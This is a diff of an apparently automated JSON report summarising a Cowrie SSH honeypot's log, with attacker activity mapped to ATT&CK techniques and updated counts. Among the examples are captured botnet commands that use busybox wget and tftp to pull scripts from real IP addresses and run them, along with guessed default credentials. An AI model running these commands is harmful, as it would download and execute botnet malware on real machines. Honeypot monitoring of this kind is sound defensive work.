@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-15 19:03:45",
+  "generated": "2026-08-15 20:03:45",
   "totals": {
-    "commands": 1397,
-    "login_failed": 2870,
-    "login_success": 235,
-    "sessions": 3126
+    "commands": 1770,
+    "login_failed": 3098,
+    "login_success": 337,
+    "sessions": 3407
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2870,
+      "count": 3098,
       "examples": [
         "adminuser / 123456",
         "root / Qq123456",
@@ -21,14 +21,14 @@
         "milad / milad"
       ],
       "first": "2026-08-15T00:00:01.563880Z",
-      "last": "2026-08-15T19:03:21.533291Z",
-      "unique_ips": 108
+      "last": "2026-08-15T20:03:44.531932Z",
+      "unique_ips": 113
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 235,
+      "count": 337,
       "examples": [
         "enable / system",
         " / ",
@@ -37,14 +37,14 @@
         "admin / admin"
       ],
       "first": "2026-08-15T00:02:00.287482Z",
-      "last": "2026-08-15T19:02:18.780116Z",
-      "unique_ips": 75
+      "last": "2026-08-15T20:02:18.122750Z",
+      "unique_ips": 81
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 208,
+      "count": 212,
       "examples": [
         "/bin/busybox cp /bin/busybox condi72; >condi72; /bin/busybox chmod 777 condi72; /bin/busybox condixx",
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
@@ -53,14 +53,14 @@
         ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/"
       ],
       "first": "2026-08-15T00:48:26.058950Z",
-      "last": "2026-08-15T18:40:36.299692Z",
+      "last": "2026-08-15T19:55:07.898556Z",
       "unique_ips": 22
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 66,
+      "count": 68,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         "http://2.26.136.128/twget.sh",
@@ -69,14 +69,14 @@
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
       ],
       "first": "2026-08-15T01:16:22.114595Z",
-      "last": "2026-08-15T18:40:36.299692Z",
-      "unique_ips": 17
+      "last": "2026-08-15T19:59:18.299235Z",
+      "unique_ips": 18
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 21,
+      "count": 24,
       "examples": [
         "uname -s -m",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
@@ -85,8 +85,8 @@
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-08-15T00:56:10.378109Z",
-      "last": "2026-08-15T18:55:43.283115Z",
-      "unique_ips": 16
+      "last": "2026-08-15T20:02:19.473161Z",
+      "unique_ips": 19
     },
     {
       "id": "T1033",
@@ -222,27 +222,27 @@
     ],
     [
       "sh",
-      188
+      284
     ],
     [
       "shell",
-      176
+      270
     ],
     [
       "system",
-      165
+      259
     ],
     [
       "enable",
-      34
-    ],
-    [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      22
+      38
     ],
     [
       "linuxshell",
-      22
+      26
+    ],
+    [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      24
     ],
     [
       "cd /proc && cat self/cmdline",
@@ -262,39 +262,39 @@
     ],
     [
       "shel",
-      13
+      15
     ],
     [
       "/bin/busybox BOTNET",
       10
     ],
     [
-      "/bin/busybox SORA",
-      7
-    ],
-    [
       ">/tmp/.codi && cd /tmp/",
-      4
+      8
     ],
     [
       ">/var/.codi && cd /var/",
-      4
+      8
     ],
     [
       ">/dev/.codi && cd /dev/",
-      4
+      8
     ],
     [
       ">/mnt/.codi && cd /mnt/",
-      4
+      8
     ],
     [
       ">/var/run/.codi && cd /var/run/",
-      4
+      8
     ],
     [
       ">/var/tmp/.codi && cd /var/tmp/",
-      4
+      8
+    ],
+    [
+      ">/.codi && cd /",
+      8
     ]
   ]
 }
